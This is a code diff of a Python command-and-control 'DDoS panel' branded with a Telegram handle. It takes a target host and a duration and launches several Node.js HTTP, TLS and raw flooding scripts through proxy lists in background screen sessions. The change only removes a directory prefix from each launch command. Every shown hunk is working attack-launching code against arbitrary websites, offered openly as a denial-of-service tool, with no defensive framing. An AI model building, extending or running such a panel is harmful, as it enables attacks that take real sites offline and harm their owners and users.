@@ -78,15 +78,15 @@ def main():
             os.system("python3 installer.py")
             print("Done")
         elif cnc.lower() == "proxy":
-            os.system(f'cd Layer7 && python3 scrape.py')
+            os.system(f'python3 scrape.py')
 
         elif "httpx" in cnc.lower():
             try:
                 host = cnc.split()[1]
                 attack_time = cnc.split()[2]
                 os.system("clear")
-                os.system(f'cd Layer7 && screen -dm node HTTPX {host} {attack_time} 8 8 proxy.txt')
-                os.system(f'cd Layer7 && screen -dm node HTTPZ {host} {attack_time} 8 8 proxy.txt')
+                os.system(f'screen -dm node HTTPX {host} {attack_time} 8 8 proxy.txt')
+                os.system(f'screen -dm node HTTPZ {host} {attack_time} 8 8 proxy.txt')
                 sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                 sys.stdout.flush()
                 print(f""" 
@@ -108,7 +108,7 @@ Type [CLS] to clear the terminal""")
                 host = cnc.split()[1]
                 attack_time = cnc.split()[2]
                 os.system("clear")
-                os.system(f'cd Layer7 && screen -dm node STROM {host} {attack_time} 8 8 proxy.txt')
+                os.system(f'screen -dm node STROM {host} {attack_time} 8 8 proxy.txt')
                 sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                 sys.stdout.flush()
                 print(f""" 
@@ -130,10 +130,10 @@ Type [CLS] to clear the terminal""")
                 host = cnc.split()[1]
                 attack_time = cnc.split()[2]
                 os.system("clear")
-                os.system(f'cd Layer7 && screen -dm node HTTPZ {host} {attack_time} 8 8 proxy.txt')
-                os.system(f'cd Layer7 && screen -dm node HTTPX {host} {attack_time} 8 8 proxy.txt')
-                os.system(f'cd Layer7 && screen -dm node HammzXG {host} {attack_time} 512 258 proxy.txt')
-                os.system(f'cd Layer7 && node browser.js {host} 8 proxy.txt 64 {time} true --fin true --load true --headers true --blocked Indonesia --reconnect true --ipv6 true')
+                os.system(f'screen -dm node HTTPZ {host} {attack_time} 8 8 proxy.txt')
+                os.system(f'screen -dm node HTTPX {host} {attack_time} 8 8 proxy.txt')
+                os.system(f'screen -dm node HammzXG {host} {attack_time} 512 258 proxy.txt')
+                os.system(f'node browser.js {host} 8 proxy.txt 64 {time} true --fin true --load true --headers true --blocked Indonesia --reconnect true --ipv6 true')
                 sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                 sys.stdout.flush()
                 print(f""" 
@@ -155,8 +155,8 @@ Type [CLS] to clear the terminal""")
                 host = cnc.split()[1]
                 attack_time = cnc.split()[2]
                 os.system("clear")
-                os.system(f'cd Layer7 && screen -dm node HTPPSV2 GET {host} {attack_time} 8 8 proxy.txt')
-                os.system(f'cd Layer7 && screen -dm node HTTPS POST {host} {attack_time} 8 8 proxy.txt')
+                os.system(f'screen -dm node HTPPSV2 GET {host} {attack_time} 8 8 proxy.txt')
+                os.system(f'screen -dm node HTTPS POST {host} {attack_time} 8 8 proxy.txt')
                 sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                 sys.stdout.flush()
                 print(f""" 
@@ -178,8 +178,8 @@ Type [CLS] to clear the terminal""")
                 host = cnc.split()[1]
                 attack_time = cnc.split()[2]
                 os.system("clear")
-                os.system(f'cd Layer7 && screen -dm node HTPPSV2 POST {host} {attack_time} 8 8 proxy.txt --full')
-                os.system(f'cd Layer7 && screen -dm node HTTPS GET {host} {attack_time} 8 8 proxy.txt')
+                os.system(f'screen -dm node HTPPSV2 POST {host} {attack_time} 8 8 proxy.txt --full')
+                os.system(f'screen -dm node HTTPS GET {host} {attack_time} 8 8 proxy.txt')
                 sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                 sys.stdout.flush()
                 print(f""" 
@@ -201,8 +201,8 @@ Type [CLS] to clear the terminal""")
                 host = cnc.split()[1]
                 attack_time = cnc.split()[2]
                 os.system("clear")
-                os.system(f'cd Layer7 && screen -dm node RESETV2 {host} {attack_time} 8 8 proxy.txt --full')
-                os.system(f'cd Layer7 && screen -dm node RESET {host} {attack_time} 8 8 proxy.txt')
+                os.system(f'screen -dm node RESETV2 {host} {attack_time} 8 8 proxy.txt --full')
+                os.system(f'screen -dm node RESET {host} {attack_time} 8 8 proxy.txt')
                 sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                 sys.stdout.flush()
                 print(f""" 
@@ -224,7 +224,7 @@ Type [CLS] to clear the terminal""")
                 host = cnc.split()[1]
                 attack_time = cnc.split()[2]
                 os.system("clear")
-                os.system(f'cd Layer7 && screen -dm node RAW {host} {attack_time}')
+                os.system(f'screen -dm node RAW {host} {attack_time}')
                 sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                 sys.stdout.flush()
                 print(f""" 
@@ -246,7 +246,7 @@ Type [CLS] to clear the terminal""")
                 host = cnc.split()[1]
                 attack_time = cnc.split()[2]
                 os.system("clear")
-                os.system(f'cd Layer7 && screen -dm node VORTEX {host} {attack_time} 8 8 proxy.txt')
+                os.system(f'screen -dm node VORTEX {host} {attack_time} 8 8 proxy.txt')
                 sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                 sys.stdout.flush()
                 print(f""" 
@@ -268,8 +268,8 @@ Type [CLS] to clear the terminal""")
                 host = cnc.split()[1]
                 attack_time = cnc.split()[2]
                 os.system("clear")
-                os.system(f'cd Layer7 && screen -dm node TLS {host} {attack_time} 8 8 proxy.txt')
-                os.system(f'cd Layer7 && screen -dm node TLSV2 {host} {attack_time} 8 8 proxy.txt')
+                os.system(f'screen -dm node TLS {host} {attack_time} 8 8 proxy.txt')
+                os.system(f'screen -dm node TLSV2 {host} {attack_time} 8 8 proxy.txt')
                 sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                 sys.stdout.flush()
                 print(f""" 
@@ -291,10 +291,10 @@ Type [CLS] to clear the terminal""")
                 host = cnc.split()[1]
                 attack_time = cnc.split()[2]
                 os.system("clear")
-                os.system(f'cd Layer7 && screen -dm node HTTPZ {host} {attack_time} 8 8 proxy.txt')
-                os.system(f'cd Layer7 && screen -dm node HTTPX {host} {attack_time} 8 8 proxy.txt')
-                os.system(f'cd Layer7 && screen -dm node HammzXG {host} {attack_time} 512 258 proxy.txt')
-                os.system(f'cd Layer7 && screen -dm node RAW {host} {attack_time}')
+                os.system(f'screen -dm node HTTPZ {host} {attack_time} 8 8 proxy.txt')
+                os.system(f'screen -dm node HTTPX {host} {attack_time} 8 8 proxy.txt')
+                os.system(f'screen -dm node HammzXG {host} {attack_time} 512 258 proxy.txt')
+                os.system(f'screen -dm node RAW {host} {attack_time}')
                 time.sleep(3)
                 os.system('clear')
                 os.system('screen -ls')
